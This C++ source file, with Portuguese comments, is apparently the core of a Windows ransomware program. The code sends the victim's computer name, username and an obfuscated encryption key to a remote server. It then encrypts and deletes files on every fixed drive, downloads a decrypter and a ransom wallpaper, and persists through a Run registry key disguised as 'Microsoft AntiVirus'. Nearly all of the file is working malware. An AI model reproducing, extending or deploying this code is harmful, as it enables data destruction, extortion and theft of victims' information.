#pragma warning (disable : 4996) // Desativa o aviso 4996 do compilador
#pragma comment(lib,"ws2_32.lib") // Link com a winsock library com pragma

// Inclusões de livrarias
#include "config.h"
#include "GeneralOperations.h"
#include "FileOperations.h"
#include "Crypt.h"

SOCKET connectToServer(char* szServerName, WORD portNum) {
	struct hostent* hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET conn;

	conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (conn == INVALID_SOCKET) {
		return NULL;
	}

	if (inet_addr(szServerName) == INADDR_NONE) { // Verifica se o parâmetro tem um endereço legítimo da Internet comparado se o valor retornado é INADDR_NONE
		hp = gethostbyname(szServerName); // Se nenhum erro ocorrer retornará um ponteiro para a estrutura do host (info acerca do host/ IPV4,host_name...)
	}
	else {
		addr = inet_addr(szServerName);
		hp = gethostbyaddr((char*)&addr, sizeof(addr), AF_INET);
	}

	if (hp == NULL) {
		closesocket(conn);
		return NULL;
	}

	server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(portNum);
	if (connect(conn, (struct sockaddr*) & server, sizeof(server))) {
		closesocket(conn);
		return NULL;
	}
	return conn;
}

int getHeaderLength(char* content) {
	if (content == NULL) {
		return 0;
	}

	const char* srchStr1 = "\r\n\r\n", * srchStr2 = "\n\r\n\r";
	char* findPos;
	int ofset = -1;

	findPos = strstr(content, srchStr1);
	if (findPos != NULL) {
		ofset = findPos - content;
		ofset += strlen(srchStr1);
	}
	else {
		findPos = strstr(content, srchStr2);
		if (findPos != NULL) {
			ofset = findPos - content;
			ofset += strlen(srchStr2);
		}
	}
	return ofset;
}

void mParseUrl(char const* mUrl, string& serverName, string& filepath, string& filename) {
	string::size_type n;
	string url = mUrl;

	if (url.substr(0, 7) == "http://") {
		url.erase(0, 7);
	}

	if (url.substr(0, 8) == "https://") {
		url.erase(0, 8);
	}

	n = url.find('/');
	if (n != string::npos) {
		serverName = url.substr(0, n);
		filepath = url.substr(n);
		n = filepath.rfind('/');
		filename = filepath.substr(n + 1);
	}
	else {
		serverName = url;
		filepath = "/";
		filename = "";
	}
}

char* readUrl2(char const* szUrl, char const* szFile, int port, char const* szRequestType, long& bytesReturnedOut, char** headerOut) {
	const int bufSize = 2048;
	char readBuffer[bufSize], sendBuffer[bufSize], tmpBuffer[bufSize];
	char* tmpResult = NULL, * result;
	SOCKET conn;
	string server, filepath, filename;
	long totalBytesRead, thisReadSize, headerLen;

	mParseUrl(szUrl, server, filepath, filename);

	conn = connectToServer((char*)server.c_str(), port);

	sprintf(tmpBuffer, "%s %s HTTP/1.0", szRequestType, szFile);
	strcpy(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	sprintf(tmpBuffer, "Host: %s", server.c_str());
	strcat(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	strcat(sendBuffer, "\r\n");
	send(conn, sendBuffer, strlen(sendBuffer), 0);

	printf("Buffer being sent:\n%s", sendBuffer);

	totalBytesRead = 0;
	while (1) {
		memset(readBuffer, 0, bufSize);
		thisReadSize = recv(conn, readBuffer, bufSize, 0);

		if (thisReadSize <= 0)
			break;

		tmpResult = (char*)realloc(tmpResult, thisReadSize + totalBytesRead);

		memcpy(tmpResult + totalBytesRead, readBuffer, thisReadSize);
		totalBytesRead += thisReadSize;
	}

	headerLen = getHeaderLength(tmpResult);
	long contenLen = totalBytesRead - headerLen;
	result = new char[contenLen + 1];
	memcpy(result, tmpResult + headerLen, contenLen);
	result[contenLen] = 0x0;
	char* myTmp;

	myTmp = new char[headerLen + 1];
	strncpy(myTmp, tmpResult, headerLen);
	myTmp[headerLen] = NULL;
	free(tmpResult);
	*headerOut = myTmp;

	bytesReturnedOut = contenLen;
	closesocket(conn);
	return(result);
}

// Função com retorno do tipo string
// É uma referência (quase como um ponteiro) para uma string que não pode ser mudada
// Forma mais rápida de passar uma string para uma função sem risco de ser alterada por erro
std::string GeneralOperations::FetchDataFromURL(std::string url, std::string& file, int port, std::string requestType) {
	const int bufLen = 2048; // Variável tipo integer constante com o comprimento do buffer
	long fileSize; // Variável que terá largura de pelo menos 32 bits.
	char* memBuffer, * headerBuffer; // Ponteiros para o tipo char

	WSADATA wsaData;
	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0) { // Verifica se Winsock iniciou ou não / 0x101 = versão do Winsock em hex.
		// Sem Winsock.dll no directório ou versão errada.
		return ""; // Retorna uma string vazia pois o WSAStartup falhou o inicio 
	}

	memBuffer = readUrl2(url.c_str(), file.c_str(), port, requestType.c_str(), fileSize, &headerBuffer);

	free(headerBuffer); // Se o ponteiro for null (declarado em cima) a função não faz nada se não liberta a memória alocada
	WSACleanup(); // WSACleanup termina o uso do  Winsock

	std::string returnValue(memBuffer); // Variável tipo string para armazenar o resultado obtido
	free(memBuffer); // Se o ponteiro for null (declarado em cima) a função não faz nada se não liberta a memória alocada
	return returnValue; // Retorna o valor em string obtido no Web Server
}

void GeneralOperations::DownloadData(std::string url, std::string file, int port, std::string requestType, std::string fileDestination) {
	const int bufLen = 1024;
	long fileSize;
	char* memBuffer, * headerBuffer;
	FILE* fp;

	WSADATA wsaData;
	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0) {
		return;
	}

	memBuffer = readUrl2(url.c_str(), file.c_str(), port, requestType.c_str(), fileSize, &headerBuffer);

	if (fileSize != 0) {
		fp = fopen(fileDestination.c_str(), "wb");
		fwrite(memBuffer, 1, fileSize, fp);
		fclose(fp);
		free(headerBuffer);
	}

	free(memBuffer);

	WSACleanup();
}

// Função com retorno do tipo string
std::string GeneralOperations::ComputerName() {
	char computerName[MAX_COMPUTERNAME_LENGTH + 1]; // Declarar variavel com o tamanho disponivel no buffer que é 15 + 1 para o caracter nulo final (null terminator character)
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);  // Indica no input o tamanho do buffer em TCHAR's e no output indica o número de TCHAR's copiados para o buffer destino sem incluir o caracter nulo final (null terminator character)

	GetComputerNameA(computerName, &size); // Devolve o nome do computador
	return std::string(computerName); // Função retorna o nome do computador
}

// Função com retorno do tipo string
std::string GeneralOperations::Username() {
	char computerUsername[UNLEN + 1]; // Declarar variavel com o tamanho disponivel no buffer que é 256 + 1 para o caracter nulo final (null terminator character)
	DWORD size = sizeof(computerUsername) / sizeof(computerUsername[0]); // Indica no input o tamanho do buffer em TCHAR's e no output indica o número de TCHAR's copiados para o buffer destino sem incluir o caracter nulo final (null terminator character)

	GetUserNameA(computerUsername, &size); // Devolve o nome do utilizador
	return std::string(computerUsername); // Função retorna o nome do utilizador com sessão iniciada
}

void GeneralOperations::AddRun(){
	HKEY hKey;
    TCHAR szFilepath[MAX_PATH];
    TCHAR szFilename[MAX_PATH];
    TCHAR szDestpath[MAX_PATH];

    GetModuleFileNameA(NULL, szFilepath, MAX_PATH);
    GetFileTitle(szFilepath, szFilename, MAX_PATH);
    GetTempPathA(MAX_PATH, szDestpath);

    lstrcat(szDestpath, TEXT("\\"));
    lstrcat(szDestpath, szFilename);

    std::cout << szFilepath << endl;
    std::cout << szFilename << endl;
    std::cout << szDestpath << endl;

    CopyFile(szFilepath, szDestpath, FALSE);

    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, "Microsoft AntiVirus", 0, REG_SZ, (LPBYTE)szDestpath, sizeof(szDestpath));
    RegCloseKey(hKey);
}

void GeneralOperations::LockFiles() {
	config::init(); // Executa a função do namespace config

	auto password = Crypt::GenerateRandomPassword(); // Gera uma password

	std::string hashedPassword = Crypt::XOR(password);
	std::string computerInfo = GeneralOperations::ComputerName() + GeneralOperations::Username();
	computerInfo = computerInfo.append(hashedPassword);
	hashedPassword = Crypt::Base64Encode(computerInfo);

	auto computername = ComputerName(); // Declara um variavel que invoca a função ComputerName()
	auto username = Username(); // Declara um variavel que invoca a função Username()

	std::string setupUrl("/setup?"); // Declara um variavel do tipo string

	 // Adicionar texto existente mais o novo texto a variável 
	setupUrl.append("c=");
	setupUrl.append(computername);
	setupUrl.append("&u=");
	setupUrl.append(username);
	setupUrl.append("&p=");
	setupUrl.append(hashedPassword);
	// Final: /setup?c=ExemploComputer&u=ExemploUsername&p=SecretPassword

	std::cout << "URL: " << setupUrl << endl; // Print resultado da string final

	std::string result = "0"; // Declara uma variavel do tipo string com valor "0"
	try { // Tenta fazer a conexão
		result = FetchDataFromURL(HOST_NAME, setupUrl, HOST_PORT, "POST"); // Invoca a função FetchDataFromURL() e passa os devidos parâmetros
	}
	catch (int) { // Caso contrário devolve erro
	}

	if (result.compare("1") == 0) { // Se o resultado da conexão for 1 foi inserido corretamente na BD. do Web Server
		std::cout << "KEY HAS BEEN SUCCESSFULLY STORED!" << endl; // Print msg debug
		// Começa encriptar ficheiros
		Crypt Crypt;
		std::vector<std::string> hddDriverNames;
		GeneralOperations::GetHardDiskDrivesNames(hddDriverNames);

		char myPath[_MAX_PATH + 1];
		GetModuleFileName(NULL, myPath, _MAX_PATH);

		for (size_t i = 0; i < hddDriverNames.size(); i++) {
			std::string drive = hddDriverNames.at(i);
			FileOperations::SetDirectory(drive + SEARCH_PATH);
			std::vector<std::string> files;
			FileOperations::SearchDirectory(files, FileOperations::GetDirectory(), config::ENCRYPT_EXTENSIONS, true);

			auto end = files.end();
			for (auto it = files.begin(); it != end; ++it) {
				std::string newFileName = (*it) + "." + DEFAULT_ENCRYPT_EXTENSION;
				Crypt.LockFile(const_cast<char*>((*it).c_str()), const_cast<char*>(newFileName.c_str()), const_cast<char*>(password.c_str()));
				SetFileAttributes((*it).c_str(), GetFileAttributes((*it).c_str()) & ~FILE_ATTRIBUTE_READONLY);
				remove(const_cast<char*>((*it).c_str()));
			}
		}
		GeneralOperations::Decrypter();
		GeneralOperations::ChangeWallpeper();
	} else if (result.compare("0") == 0) { // Se o resultado da conexão for 0 não foi inserido corretamente na BD. do Web Server
		GeneralOperations::AddRun();
	} else { // Se o resultado da conexão for 0 nem 1 ocorreu algum erro no Web Server
		GeneralOperations::AddRun();
	}
}

void GeneralOperations::GetHardDiskDrivesNames(std::vector<std::string>& strIPAddresses)
{
	DWORD dwBufferSize = GetLogicalDriveStrings(0, NULL);
	char* pDrives = (char*)malloc(dwBufferSize + 1);
	char* pDrivesToDelete = pDrives;
	if (pDrives != NULL) {
		GetLogicalDriveStrings(dwBufferSize, pDrives);
		while (*pDrives) {
			UINT nDriveType = GetDriveType(pDrives);

			if (DRIVE_FIXED == nDriveType) {
				strIPAddresses.push_back(pDrives);
			}
			pDrives += lstrlen(pDrives) + 1;
		}

		free(pDrivesToDelete);

		pDrivesToDelete = NULL;
	}
}

void GeneralOperations::ChangeWallpeper() {
	std::string executionPath;
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	std::cout << pos << endl; // Print resultado do pos
	if (pos == string::npos) {
		executionPath = "c:\\";
	} else {
		executionPath = string(buffer).substr(0, pos);
	}

	std::string wallpaperPath = executionPath + WALLPAPER_LOCAL_NAME;
	std::cout << wallpaperPath << endl; // Print resultado da string final
	DownloadData(HOST_NAME, WALLPAPER_PATH, HOST_PORT, "GET", wallpaperPath);
	auto result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, const_cast<char*>(wallpaperPath.c_str()), SPIF_UPDATEINIFILE);
}

void GeneralOperations::Decrypter() {
	std::string executionPath;
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	std::cout << pos << endl; // Print resultado do pos
	if (pos == string::npos) {
		executionPath = "c:\\";
	} else {	
		executionPath = string(buffer).substr(0, pos);
	}

	std::string decrypterPath = executionPath + DECRYPTER_LOCAL_NAME;
	std::cout << decrypterPath << endl; // Print resultado da string final
	DownloadData(HOST_NAME, DECRYPTER_PATH, HOST_PORT, "GET", decrypterPath);
	auto result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, const_cast<char*>(decrypterPath.c_str()), SPIF_UPDATEINIFILE);
}